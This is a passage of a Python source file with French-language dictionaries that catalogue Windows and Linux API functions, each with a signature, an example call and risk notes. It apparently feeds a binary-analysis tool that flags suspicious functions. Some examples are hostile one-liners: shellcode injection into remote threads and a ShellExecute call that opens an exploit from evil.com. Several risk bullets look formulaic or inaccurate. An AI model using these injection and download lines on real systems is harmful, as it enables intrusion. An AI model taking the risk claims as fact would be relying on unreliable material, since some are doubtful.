    'closedir': '[b][color=blue]int closedir(DIR *dirp)[/color][/b]\n[code]closedir(dir);[/code]\n[color=red]• Double close → corruption mémoire\n• UAF si réutilisation de dirp[/color]',
    'scandir': '[b][color=blue]int scandir(const char *dirp, struct dirent ***namelist, int (*filter)(const struct dirent *), int (*compar)(const struct dirent **, const struct dirent **))[/color][/b]\n[code]scandir("/tmp", &list, NULL, alphasort);[/code]\n[color=red]• Heap overflow via contrôle de namelist\n• Fuite de mémoire si mal géré[/color]',
    'alphasort': '[b][color=blue]int alphasort(const struct dirent **a, const struct dirent **b)[/color][/b]\n[code]alphasort(&a, &b);[/code]\n[color=red]• Comportement indéfini si pointeurs invalides[/color]',
    'getcwd': '[b][color=blue]char *getcwd(char *buf, size_t size)[/color][/b]\n[code]getcwd(buf, 1024);[/code]\n[color=red]• Buffer overflow si size trop petit\n• Fuite de chemins sensibles[/color]',
    'chdir': '[b][color=blue]int chdir(const char *path)[/color][/b]\n[code]chdir("/tmp");[/code]\n[color=red]• Path traversal si path non validé\n• TOCTOU race condition[/color]',
    'fchdir': '[b][color=blue]int fchdir(int fd)[/color][/b]\n[code]fchdir(fd);[/code]\n[color=red]• Mêmes risques que chdir + contrôle de FD[/color]',
    'dup': '[b][color=blue]int dup(int oldfd)[/color][/b]\n[code]int newfd = dup(oldfd);[/code]\n[color=red]• FD leaks si non fermés\n• Double close → corruption mémoire[/color]',
    'dup2': '[b][color=blue]int dup2(int oldfd, int newfd)[/color][/b]\n[code]dup2(oldfd, newfd);[/code]\n[color=red]• Hijacking de stdout/stderr\n• FD exhaustion attacks\n• Combine avec shellcode pour redirection I/O[/color]',
    'pipe': '[b][color=blue]int pipe(int pipefd[2])[/color][/b]\n[code]int pipefd[2]; pipe(pipefd);[/code]\n[color=red]• Exploitation de race conditions\n• Combine avec dup2 pour redirection I/O[/color]',
    'fcntl': '[b][color=blue]int fcntl(int fd, int cmd, ... /* arg */)[/color][/b]\n[code]fcntl(fd, F_SETFL, O_NONBLOCK);[/code]\n[color=red]• Manipulation de FD pour exploitation\n• Combine avec dup2 pour redirection I/O[/color]',
    'ioctl': '[b][color=blue]int ioctl(int fd, unsigned long request, ...)[/color][/b]\n[code]ioctl(fd, TIOCSTI, "root");[/code]\n[color=red]• Kernel pwn via commandes non filtrées\n• Arbitrary write avec certaines requests\n• Combine avec /dev/kmem[/color]',
    'select': '[b][color=blue]int select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout)[/color][/b]\n[code]select(nfds, &readfds, NULL, NULL, &timeout);[/code]\n[color=red]• Denial-of-Service via timeout élevé\n• Fuite de mémoire via fd_set non initialisé[/color]',
    'poll': '[b][color=blue]int poll(struct pollfd *fds, nfds_t nfds, int timeout)[/color][/b]\n[code]poll(fds, nfds, timeout);[/code]\n[color=red]• Mêmes risques que select\n• Fuite de mémoire via fds non initialisé[/color]',
    'epoll': '[b][color=blue]int epoll_create(int size)[/color][/b]\n[code]int epfd = epoll_create(10);[/code]\n[color=red]• Exploitation de race conditions\n• Combine avec dup2 pour redirection I/O[/color]',
    'inotify': '[b][color=blue]int inotify_init(void)[/color][/b]\n[code]int inotify_fd = inotify_init();[/code]\n[color=red]• Exploitation de race conditions\n• Combine avec dup2 pour redirection I/O[/color]',
}



all_process_manipulation_functions = { #FAIT
  
    'nom_du_dictionnaire': 'Toutes les fonctions d\'injection de processus',
    'CreateRemoteThread': 'Crée un thread dans un processus distant',
    'VirtualAllocEx': 'Alloue de la mémoire dans un processus distant',
    'WriteProcessMemory': 'Écrit dans la mémoire d\'un processus distant',
    'QueueUserAPC': 'Ajoute une procédure à la file d\'attente d\'un thread distant',
    'NtCreateThreadEx': 'Crée un thread dans un processus distant (NT)',
    'RtlCreateUserThread': 'Crée un thread dans un processus distant (RTL)',
    'SetThreadContext': 'Modifie le contexte d\'un thread distant',
    'GetThreadContext': 'Récupère le contexte d\'un thread distant',
    'SuspendThread': 'Suspend un thread distant',
    'ResumeThread': 'Reprend un thread distant',
    'OpenProcess': 'Ouvre un processus distant',
    'LoadLibrary': 'Charge une bibliothèque dans un processus distant',
    'GetProcAddress': 'Récupère l\'adresse d\'une fonction dans une bibliothèque chargée',
    'FreeLibrary': 'Libère une bibliothèque chargée dans un processus distant',
    'CreateProcess': 'Crée un nouveau processus',
    'ShellExecute': 'Exécute un programme ou ouvre un fichier',
    'WinExec': 'Exécute un programme',
    'ptrace': 'Permet de manipuler un processus distant (GLIBC, Linux)',
    'fork': 'Crée un nouveau processus en dupliquant le processus actuel (GLIBC, Linux)',
    'execve': 'Remplace l\'image du processus actuel par un nouveau programme (GLIBC, Linux)',
    'execv': 'Remplace l\'image du processus actuel par un nouveau programme (GLIBC, Linux)',
    'execl': 'Remplace l\'image du processus actuel par un nouveau programme (GLIBC, Linux)',
    'execvp': 'Remplace l\'image du processus actuel par un nouveau programme (GLIBC, Linux)',
    'execle': 'Remplace l\'image du processus actuel par un nouveau programme (GLIBC, Linux)',
    'execlp': 'Remplace l\'image du processus actuel par un nouveau programme (GLIBC, Linux)',
    'dlopen': 'Charge une bibliothèque dynamique (GLIBC, Linux)',
    'dlsym': 'Récupère l\'adresse d\'une fonction dans une bibliothèque dynamique (GLIBC, Linux)',
    'dlclose': 'Libère une bibliothèque dynamique (GLIBC, Linux)',
    'mmap': 'Mappe un fichier ou un périphérique en mémoire (GLIBC, Linux)',
    'munmap': 'Démappe un fichier ou un périphérique de la mémoire (GLIBC, Linux)',
    'mprotect': 'Modifie les permissions d\'une région de mémoire (GLIBC, Linux)',
    'syscall': 'Appelle un appel système directement (GLIBC, Linux)',
    'clone': 'Crée un nouveau processus ou thread avec un contrôle fin (GLIBC, Linux)',
    'waitpid': 'Attend la fin d\'un processus enfant (GLIBC, Linux)',
    'kill': 'Envoie un signal à un processus (GLIBC, Linux)',
    'signal': 'Définit un gestionnaire de signal (GLIBC, Linux)',
    'sigaction': 'Définit un gestionnaire de signal avec plus de contrôle (GLIBC, Linux)',
    'pthread_create': 'Crée un nouveau thread (GLIBC, Linux)',
    'pthread_join': 'Attend la fin d\'un thread (GLIBC, Linux)',
    'pthread_exit': 'Termine un thread (GLIBC, Linux)',
    'pthread_cancel': 'Annule un thread (GLIBC, Linux)',
    'pthread_kill': 'Envoie un signal à un thread (GLIBC, Linux)',
    'shmget': 'Crée un segment de mémoire partagée (GLIBC, Linux)',
    'shmat': 'Attache un segment de mémoire partagée (GLIBC, Linux)',
    'shmdt': 'Détache un segment de mémoire partagée (GLIBC, Linux)',
    'shmctl': 'Contrôle un segment de mémoire partagée (GLIBC, Linux)',
    'msgget': 'Crée une file de messages (GLIBC, Linux)',
    'msgsnd': 'Envoie un message dans une file de messages (GLIBC, Linux)',
    'msgrcv': 'Reçoit un message d\'une file de messages (GLIBC, Linux)',
    'msgctl': 'Contrôle une file de messages (GLIBC, Linux)',
    'semget': 'Crée un ensemble de sémaphores (GLIBC, Linux)',
    'semop': 'Effectue des opérations sur un ensemble de sémaphores (GLIBC, Linux)',
    'semctl': 'Contrôle un ensemble de sémaphores (GLIBC, Linux)',
    'pipe': 'Crée un tube (pipe) pour la communication inter-processus (GLIBC, Linux)',
    'socketpair': 'Crée une paire de sockets connectés (GLIBC, Linux)',
    'dup': 'Duplique un descripteur de fichier (GLIBC, Linux)',
    'dup2': 'Duplique un descripteur de fichier vers un autre (GLIBC, Linux)',
    'fcntl': 'Contrôle les propriétés d\'un descripteur de fichier (GLIBC, Linux)',
    'ioctl': 'Contrôle les propriétés d\'un périphérique ou d\'un fichier (GLIBC, Linux)',
    'select': 'Surveille plusieurs descripteurs de fichiers pour des événements (GLIBC, Linux)',
    'poll': 'Surveille plusieurs descripteurs de fichiers pour des événements (GLIBC, Linux)',
    'epoll': 'Surveille plusieurs descripteurs de fichiers pour des événements (GLIBC, Linux)',
    'inotify': 'Surveille les modifications de fichiers (GLIBC, Linux)'

}

all_process_manipulation_functions_infos = { #FAIT

    'nom_du_dictionnaire': '[color=red]Fonctions de manipulation de processus identifiées[/color]',
    
    'CreateRemoteThread': (
        '[color=blue][code]HANDLE CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);[/code][/color]\n'
        '[code]HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)0xDEADBEEF, NULL, 0, NULL);[/code]\n'
        '[color=red]• Code injection via thread hijacking\n• TOCTOU attacks on process handles\n• Privilege escalation via token impersonation[/color]'
    ),
    
    'VirtualAllocEx': (
        '[color=blue][code]LPVOID VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);[/code][/color]\n'
        '[code]LPVOID addr = VirtualAllocEx(hProc, NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);[/code]\n'
        '[color=red]• RWX memory regions for shellcode staging\n• ASLR bypass through predictable allocations\n• Handle validation race conditions[/color]'
    ),

    'WriteProcessMemory': (
        '[color=blue][code]BOOL WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);[/code][/color]\n'
        '[code]WriteProcessMemory(hProc, 0x401000, "\x90\x90\xCC\xC3", 4, NULL);[/code]\n'
        '[color=red]• Arbitrary memory corruption primitives\n• EIP control via function pointer overwrites\n• PatchGuard bypass on legacy systems[/color]'
    ),

    'QueueUserAPC': (
        '[color=blue][code]DWORD QueueUserAPC(PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData);[/code][/color]\n'
        '[code]QueueUserAPC((PAPCFUNC)shellcode_addr, hThread, 0);[/code]\n'
        '[color=red]• Alertable thread state hijacking\n• User-mode APCs for EoP chains\n• Context confusion in multi-threaded apps[/color]'
    ),

    'NtCreateThreadEx': (
        '[color=blue][code]NTSTATUS NtCreateThreadEx(PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter, ULONG Flags, SIZE_T StackZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer);[/code][/color]\n'
        '[code]NtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProcess, shellcode, NULL, 0, 0, 0, 0, NULL);[/code]\n'
        '[color=red]• Direct syscall abuse for AV evasion\n• Handle access right escalation\n• Kernel APC injection vectors[/color]'
    ),

    'RtlCreateUserThread': (
        '[color=blue][code]NTSTATUS RtlCreateUserThread(HANDLE ProcessHandle, PSECURITY_DESCRIPTOR SecurityDescriptor, BOOLEAN CreateSuspended, ULONG StackZeroBits, SIZE_T StackReserve, SIZE_T StackCommit, PVOID StartAddress, PVOID StartParameter, PHANDLE ThreadHandle, PCLIENT_ID ClientId);[/code][/color]\n'
        '[code]RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, shellcode, NULL, &hThread, NULL);[/code]\n'
        '[color=red]• Native API injection patterns\n• Thread handle leakage\n• Nt* function hooking bypass[/color]'
    ),

    'SetThreadContext': (
        '[color=blue][code]BOOL SetThreadContext(HANDLE hThread, const CONTEXT *lpContext);[/code][/color]\n'
        '[code]ctx.Eip = 0x7FFA4512; SetThreadContext(hThread, &ctx);[/code]\n'
        '[color=red]• EIP/RIP control for ROP chains\n• Suspended thread state manipulation\n• Anti-debug bypass via context flags[/color]'
    ),

    'GetThreadContext': (
        '[color=blue][code]BOOL GetThreadContext(HANDLE hThread, LPCONTEXT lpContext);[/code][/color]\n'
        '[code]GetThreadContext(hThread, &ctx);[/code]\n'
        '[color=red]• ASLR/PIE leaks via register extraction\n• Sensitive data exposure in context structures\n• Double-fetch race conditions[/color]'
    ),

    'SuspendThread': (
        '[color=blue][code]DWORD SuspendThread(HANDLE hThread);[/code][/color]\n'
        '[code]SuspendThread(hThread);[/code]\n'
        '[color=red]• Denial-of-Service via thread freezing\n• Anti-forensic techniques\n• Suspended process injection timing attacks[/color]'
    ),

    'ResumeThread': (
        '[color=blue][code]DWORD ResumeThread(HANDLE hThread);[/code][/color]\n'
        '[code]ResumeThread(hThread);[/code]\n'
        '[color=red]• Delayed code execution triggers\n• Race condition exploitation windows\n• Thread execution hijacking[/color]'
    ),

    'OpenProcess': (
        '[color=blue][code]HANDLE OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);[/code][/color]\n'
        '[code]HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1337);[/code]\n'
        '[color=red]• PID brute-force for privilege escalation\n• Handle duplication attacks\n• Process hollowing via excessive access rights[/color]'
    ),

    'LoadLibrary': (
        '[color=blue][code]HMODULE LoadLibrary(LPCTSTR lpFileName);[/code][/color]\n'
        '[code]LoadLibrary("evil.dll");[/code]\n'
        '[color=red]• DLL hijacking via search order abuse\n• Phantom DLL ghosting\n• Reflective DLL injection entry points[/color]'
    ),

    'GetProcAddress': (
        '[color=blue][code]FARPROC GetProcAddress(HMODULE hModule, LPCSTR lpProcName);[/code][/color]\n'
        '[code]GetProcAddress(GetModuleHandle("kernel32"), "WinExec");[/code]\n'
        '[color=red]• API hooking detection bypass\n• Dynamic IAT reconstruction\n• Function pointer reuse attacks[/color]'
    ),

    'FreeLibrary': (
        '[color=blue][code]BOOL FreeLibrary(HMODULE hModule);[/code][/color]\n'
        '[code]FreeLibrary(hModule);[/code]\n'
        '[color=red]• Unload order manipulation for UAF\n• DLL rebasing race conditions\n• Exception handler invalidation[/color]'
    ),

    'CreateProcess': (
        '[color=blue][code]BOOL CreateProcess(LPCTSTR lpApplicationName, LPTSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCTSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);[/code][/color]\n'
        '[code]CreateProcess(NULL, "notepad", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);[/code]\n'
        '[color=red]• Argument injection in lpCommandLine\n• Handle inheritance privilege escalation\n• Process spoofing via parent PID[/color]'
    ),

    'ShellExecute': (
        '[color=blue][code]HINSTANCE ShellExecute(HWND hwnd, LPCTSTR lpOperation, LPCTSTR lpFile, LPCTSTR lpParameters, LPCTSTR lpDirectory, INT nShowCmd);[/code][/color]\n'
        '[code]ShellExecute(NULL, "open", "http://evil.com/exploit.exe", NULL, NULL, SW_SHOW);[/code]\n'
        '[color=red]• URI protocol handler hijacking\n• Unquoted service path exploitation\n• COM server activation attacks[/color]'
    ),

    'WinExec': (
        '[color=blue][code]UINT WinExec(LPCSTR lpCmdLine, UINT uCmdShow);[/code][/color]\n'
        '[code]WinExec("calc.exe", SW_SHOW);[/code]\n'
        '[color=red]• Command injection via argument control\n• Deprecated function behavior quirks\n• Process spawning detection evasion[/color]'
    ),

    'ptrace': (
        '[color=blue][code]long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);[/code][/color]\n'
        '[code]ptrace(PTRACE_POKETEXT, pid, addr, shellcode);[/code]\n'
        '[color=red]• Memory corruption via PTRACE_POKE*\n• Anti-debug bypass (PTRACE_TRACEME)\n• Process image modification races[/color]'
    ),

    'fork': (
        '[color=blue][code]pid_t fork(void);[/code][/color]\n'
        '[code]if (fork() == 0) { malicious_code(); }[/code]\n'
        '[color=red]• PID bruteforce races\n• Copy-on-Write memory side effects\n• Zombie process reaping attacks[/color]'
    ),

    'execve': (
        '[color=blue][code]int execve(const char *pathname, char *const argv[], char *const envp[]);[/code][/color]\n'
        '[code]char *args[] = {"/bin/sh", "-c", cmd, NULL}; execve("/bin/sh", args, NULL);[/code]\n'
        '[color=red]• PATH variable hijacking\n• Argument/Environment injection\n• File descriptor inheritance issues[/color]'
    ),

    'execv': (
        '[color=blue][code]int execv(const char *path, char *const argv[]);[/code][/color]\n'
        '[code]execv("/usr/bin/vim", argv);[/code]\n'
        '[color=red]• Relative path exploitation\n• SUID binary abuse\n• Argument count manipulation[/color]'
    ),

    'execl': (
        '[color=blue][code]int execl(const char *path, const char *arg, ...);[/code][/color]\n'
        '[code]execl("/bin/ls", "ls", "-la", NULL);[/code]\n'
        '[color=red]• Format string vulnerabilities\n• Variadic argument mismanagement\n• ENVP memory corruption[/color]'
    ),

    'execvp': (
        '[color=blue][code]int execvp(const char *file, char *const argv[]);[/code][/color]\n'
        '[code]execvp("sudo", args);[/code]\n'
        '[color=red]• PATH search order hijacking\n• Privilege escalation vectors\n• Shellshock-style environment attacks[/color]'
    ),

    'execle': (
        '[color=blue][code]int execle(const char *path, const char *arg, ..., char * const envp[]);[/code][/color]\n'
        '[code]char *env[] = {"EVIL=payload", NULL}; execle("/bin/sh", "sh", "-c", cmd, NULL, env);[/code]\n'
        '[color=red]• Controlled environment injection\n• LD_PRELOAD/LD_LIBRARY_PATH abuse\n• Stack clashing via large env[/color]'
    ),

    'execlp': (
        '[color=blue][code]int execlp(const char *file, const char *arg, ...);[/code][/color]\n'
        '[code]execlp("python", "python", "-c", py_code, NULL);[/code]\n'
        '[color=red]• File existence races in /tmp\n• Interpreter argument injection\n• Wildcard expansion vulnerabilities[/color]'
    ),

    'dlopen': (
        '[color=blue][code]void *dlopen(const char *filename, int flags);[/code][/color]\n'
        '[code]void *h = dlopen("libc.so.6", RTLD_LAZY);[/code]\n'
        '[color=red]• Shared object hijacking\n• dlopen() of attacker-controlled paths\n• $ORIGIN-based directory traversal[/color]'
    ),

    'dlsym': (
        '[color=blue][code]void *dlsym(void *handle, const char *symbol);[/code][/color]\n'
        '[code]void (*func)() = dlsym(RTLD_DEFAULT, "system");[/code]\n'
        '[color=red]• GOT/PLT overwrite detection\n• Dynamic symbol resolution hijacking\n• _dl_fini() exit() race conditions[/color]'
    ),

    'dlclose': (
        '[color=blue][code]int dlclose(void *handle);[/code][/color]\n'
        '[code]dlclose(hLib);[/code]\n'
        '[color=red]• Reference counting vulnerabilities\n• Destructor (DTOR) execution order\n• ELF .fini_array manipulation[/color]'
    ),

    'mmap': (
        '[color=blue][code]void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);[/code][/color]\n'
        '[code]void *addr = mmap(NULL, 0x1000, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);[/code]\n'
        '[color=red]• RWX memory mapping for shellcode\n• Kernel physical page exhaustion\n• File-backed mapping TOCTOU[/color]'
    ),

    'munmap': (
        '[color=blue][code]int munmap(void *addr, size_t length);[/code][/color]\n'
        '[code]munmap(addr, 0x1000);[/code]\n'
        '[color=red]• Use-after-unmap memory corruption\n• ASLR weakening via predictable unmaps\n• Page fault handler races[/color]'
    ),

    'mprotect': (
        '[color=blue][code]int mprotect(void *addr, size_t len, int prot);[/code][/color]\n'
        '[code]mprotect(addr, 0x1000, PROT_EXEC);[/code]\n'
        '[color=red]• W^X bypass via incremental protection changes\n• .text segment modification\n• VDSO manipulation[/color]'
    ),

    'syscall': (
        '[color=blue][code]long syscall(long number, ...);[/code][/color]\n'
        '[code]syscall(SYS_execve, "/bin/sh", argv, envp);[/code]\n'
        '[color=red]• Direct syscall anti-hooking techniques\n• Kernel ROP gadget invocation\n• Unfiltered argument passing[/color]'
    ),

    'clone': (
        '[color=blue][code]int clone(int (*fn)(void *), void *child_stack, int flags, void *arg, ...);[/code][/color]\n'
        '[code]clone(child_func, stack, CLONE_VM|CLONE_FS, NULL);[/code]\n'
        '[color=red]• Namespace escape via CLONE_NEW*\n• Shared memory corruption\n• Kernel stack disclosure[/color]'
    ),

    'waitpid': (
        '[color=blue][code]pid_t waitpid(pid_t pid, int *wstatus, int options);[/code][/color]\n'
        '[code]waitpid(pid, &status, WNOHANG);[/code]\n'
        '[color=red]• PID recycling races\n• Status information leaks\n• Zombie process indefinite retention[/color]'
    ),

    'kill': (
        '[color=blue][code]int kill(pid_t pid, int sig);[/code][/color]\n'
        '[code]kill(pid, SIGSEGV);[/code]\n'
        '[color=red]• Signal handler hijacking\n• PID guessing for DoS\n• Signal race condition exploitation[/color]'
    ),

    'signal': (
        '[color=blue][code]void (*signal(int sig, void (*func)(int)))(int);[/code][/color]\n'
        '[code]signal(SIGINT, handler);[/code]\n'
        '[color=red]• Signal handler reuse after free\n• Async-signal-unsafe function calls\n• SA_RESETHAND race conditions[/color]'
    ),

    'sigaction': (
        '[color=blue][code]int sigaction(int signum, const struct sigaction *act, struct sigaction *oldact);[/code][/color]\n'
        '[code]struct sigaction sa; sa.sa_handler = handler; sigaction(SIGFPE, &sa, NULL);[/code]\n'
        '[color=red]• SA_SIGINFO arbitrary pointer dereference\n• Stack overflow in signal handlers\n• SA_NODEFER recursion attacks[/color]'
    ),
    # continuer avec ça : 
    'pthread_create': (
        '[color=blue][code]int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg);[/code][/color]\n'
        '[code]pthread_create(&tid, NULL, malicious_payload, NULL);[/code]\n'
        '[color=red]• Thread stack memory corruption\n• Race condition on shared resources\n• Sensitive data exposure via thread arguments[/color]'
    ),

    'pthread_join': (
        '[color=blue][code]int pthread_join(pthread_t thread, void **retval);[/code][/color]\n'
        '[code]pthread_join(tid, &status);[/code]\n'
        '[color=red]• Use-after-join memory handling\n• Return value pointer type confusion\n• Deadlock exploitation scenarios[/color]'
    ),

    'pthread_exit': (
        '[color=blue][code]void pthread_exit(void *retval);[/code][/color]\n'
        '[code]pthread_exit((void*)0xDEADBEEF);[/code]\n'
        '[color=red]• Arbitrary exit value memory disclosure\n• Dangling thread cleanup handlers\n• Unexpected process termination[/color]'
    ),

    'pthread_cancel': (
        '[color=blue][code]int pthread_cancel(pthread_t thread);[/code][/color]\n'
        '[code]pthread_cancel(tid);[/code]\n'
        '[color=red]• Async cancellation of critical sections\n• Resource cleanup bypass attacks\n• Cancellation point race conditions[/color]'
    ),

    'pthread_kill': (
        '[color=blue][code]int pthread_kill(pthread_t thread, int sig);[/code][/color]\n'
        '[code]pthread_kill(tid, SIGSEGV);[/code]\n'
        '[color=red]• Signal handler hijacking in thread context\n• Per-thject exception handling abuse\n• SIGSYS for seccomp bypass attempts[/color]'
    ),

    'shmget': (
        '[color=blue][code]int shmget(key_t key, size_t size, int shmflg);[/code][/color]\n'
        '[code]shmget(0x1337, 0x1000, IPC_CREAT|0666);[/code]\n'
        '[color=red]• Predictable IPC key generation\n• SHM permissions bypass via ftok()\n• Kernel memory exhaustion attacks[/color]'
    ),

    'shmat': (
        '[color=blue][code]void *shmat(int shmid, const void *shmaddr, int shmflg);[/code][/color]\n'
        '[code]char *mem = shmat(shmid, NULL, 0);[/code]\n'
        '[color=red]• SHM base address ASLR bypass\n• Remapping sensitive kernel memory\n• Page-aligned attack structures[/color]'
    ),

    'shmdt': (
        '[color=blue][code]int shmdt(const void *shmaddr);[/code][/color]\n'
        '[code]shmdt(mem);[/code]\n'
        '[color=red]• UAF via delayed detachment\n• Memory remapping timing attacks\n• SHM metadata corruption[/color]'
    ),

    'shmctl': (
        '[color=blue][code]int shmctl(int shmid, int cmd, struct shmid_ds *buf);[/code][/color]\n'
        '[code]shmctl(shmid, IPC_RMID, NULL);[/code]\n'
        '[color=red]• Arbitrary SHM control operations\n• Info disclosure via SHM_STAT\n• IPC namespace confusion[/color]'
    ),

    'msgget': (
        '[color=blue][code]int msgget(key_t key, int msgflg);[/code][/color]\n'
        '[code]msgget(0xDEAD, IPC_CREAT|0644);[/code]\n'
        '[color=red]• Message queue spraying attacks\n• Resource limit exhaustion\n• UID/GID permission bypass[/color]'
    ),

    'msgsnd': (
        '[color=blue][code]int msgsnd(int msqid, const void *msgp, size_t msgsz, int msgflg);[/code][/color]\n'
        '[code]msgsnd(qid, &msg, sizeof(msg)-sizeof(long), 0);[/code]\n'
        '[color=red]• Kernel heap overflow via large messages\n• Type confusion in message structs\n• Blocking queue DoS attacks[/color]'
    ),

    'msgrcv': (
        '[color=blue][code]ssize_t msgrcv(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg);[/code][/color]\n'
        '[code]msgrcv(qid, &msg, 0x1000, 0, 0);[/code]\n'
        '[color=red]• Uninitialized kernel memory disclosure\n• Type mismatched message extraction\n• Out-of-bounds reads[/color]'
    ),

    'msgctl': (
        '[color=blue][code]int msgctl(int msqid, int cmd, struct msqid_ds *buf);[/code][/color]\n'
        '[code]msgctl(qid, IPC_STAT, &ds);[/code]\n'
        '[color=red]• Sensitive IPC structure disclosure\n• Message queue metadata tampering\n• Privileged operation bypass[/color]'
    ),

    'semget': (
        '[color=blue][code]int semget(key_t key, int nsems, int semflg);[/code][/color]\n'
        '[code]semget(0x1337, 5, IPC_CREAT|0666);[/code]\n'
        '[color=red]• Semaphore array overflow attacks\n• Cross-namespace semaphore collisions\n• SEM_UNDO race conditions[/color]'
    ),

    'semop': (
        '[color=blue][code]int semop(int semid, struct sembuf *sops, size_t nsops);[/code][/color]\n'
        '[code]struct sembuf ops[] = {{0, -1, SEM_UNDO}}; semop(semid, ops, 1);[/code]\n'
        '[color=red]• Atomic operation deadlocks\n• Kernel pointer leaks via sembuf\n• SEM_UNDO list corruption[/color]'
    ),

    'semctl': (
        '[color=blue][code]int semctl(int semid, int semnum, int cmd, ...);[/code][/color]\n'
        '[code]semctl(semid, 0, SETVAL, 1);[/code]\n'
        '[color=red]• Direct semaphore value manipulation\n• Union arg memory corruption\n• IPC_INFO disclosure attacks[/color]'
    ),

    'pipe': (
        '[color=blue][code]int pipe(int pipefd[2]);[/code][/color]\n'
        '[code]int fds[2]; pipe(fds);[/code]\n'
        '[color=red]• Race condition in fd handling\n• Buffer overflow in circular buffers\n• File descriptor exhaustion[/color]'
    ),

    'socketpair': (
        '[color=blue][code]int socketpair(int domain, int type, int protocol, int sv[2]);[/code][/color]\n'
        '[code]int socks[2]; socketpair(AF_UNIX, SOCK_STREAM, 0, socks);[/code]\n'
        '[color=red]• FD passing privilege escalation\n• Descriptor confusion attacks\n• Kernel memory spraying via large sockets[/color]'
    ),

    'dup': (
        '[color=blue][code]int dup(int oldfd);[/code][/color]\n'
        '[code]int newfd = dup(0);[/code]\n'
        '[color=red]• File descriptor table overflows\n• Input/output redirection hijacking\n• Privileged fd duplication[/color]'
    ),

    'dup2': (
        '[color=blue][code]int dup2(int oldfd, int newfd);[/code][/color]\n'
        '[code]dup2(sockfd, 0);[/code]\n'
        '[color=red]• Stdio stream hijacking\n• Race condition in fd replacement\n• SUID program fd manipulation[/color]'
    ),

    'fcntl': (
        '[color=blue][code]int fcntl(int fd, int cmd, ... /* arg */ );[/code][/color]\n'
        '[code]fcntl(fd, F_SETFL, O_NONBLOCK);[/code]\n'
        '[color=red]• File lock deadlock creation\n• FD_CLOEXEC bypass attacks\n• Arbitrary kernel memory write via F_SETPIPE_SZ[/color]'
    ),

    'ioctl': (
        '[color=blue][code]int ioctl(int fd, unsigned long request, ...);[/code][/color]\n'
        '[code]ioctl(sockfd, SIOCSIFADDR, &ifreq);[/code]\n'
        '[color=red]• Kernel pointer disclosure via structure args\n• Out-of-bounds read/write in drivers\n• Unhandled request privilege escalation[/color]'
    ),

    'select': (
        '[color=blue][code]int select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout);[/code][/color]\n'
        '[code]select(maxfd+1, &read_fds, NULL, NULL, NULL);[/code]\n'
        '[color=red]• FD_SET buffer overflow\n• Timeout struct memory corruption\n• Side-channel timing attacks[/color]'
    ),

    'poll': (
        '[color=blue][code]int poll(struct pollfd *fds, nfds_t nfds, int timeout);[/code][/color]\n'
        '[code]poll(pollfds, num_fds, -1);[/code]\n'
        '[color=red]• Stack exhaustion via large nfds\n• Memory corruption in pollfd array\n• Revents field TOCTOU[/color]'
    ),

    'epoll': (
        '[color=blue][code]int epoll_create(int size);\n'
        'int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event);\n'
        'int epoll_wait(int epfd, struct epoll_event *events, int maxevents, int timeout);[/code][/color]\n'
        '[code]int epfd = epoll_create1(0); epoll_ctl(epfd, EPOLL_CTL_ADD, sockfd, &ev);[/code]\n'
        '[color=red]• Epoll set overflow attacks\n• Kernel memory exhaustion via event storms\n• Use-after-free in file descriptor handling[/color]'
    ),

    'inotify': (
        '[color=blue][code]int inotify_init(void);\n'
        'int inotify_add_watch(int fd, const char *pathname, uint32_t mask);\n'
        'int inotify_rm_watch(int fd, int wd);[/code][/color]\n'
        '[code]int inot_fd = inotify_init(); inotify_add_watch(inot_fd, "/tmp", IN_CREATE);[/code]\n'
        '[color=red]• Watch descriptor exhaustion\n• Path traversal via symlink races\n• Kernel memory disclosure in event structs[/color]'
    )
}

all_network_functions = { #FAIT
    'nom_du_dictionnaire': 'Toutes les fonctions réseau',
    'socket': 'Crée un point de communication',
    'connect': 'Établit une connexion avec un serveur',
    'send': 'Envoie des données sur une connexion',
    'recv': 'Reçoit des données sur une connexion',
    'bind': 'Lie une adresse à un socket',
    'listen': 'Met le socket en mode écoute',
    'accept': 'Accepte une connexion entrante',
    'sendto': 'Envoie des données à une adresse spécifique',
    'recvfrom': 'Reçoit des données d\'une adresse spécifique',
    'shutdown': 'Arrête une connexion',
    'closesocket': 'Ferme un socket',
    'gethostbyname': 'Récupère l\'adresse IP d\'un nom d\'hôte',
    'getaddrinfo': 'Récupère les informations d\'adresse',
    'inet_addr': 'Convertit une adresse IP en format binaire',
    'inet_ntoa': 'Convertit une adresse IP en format texte',
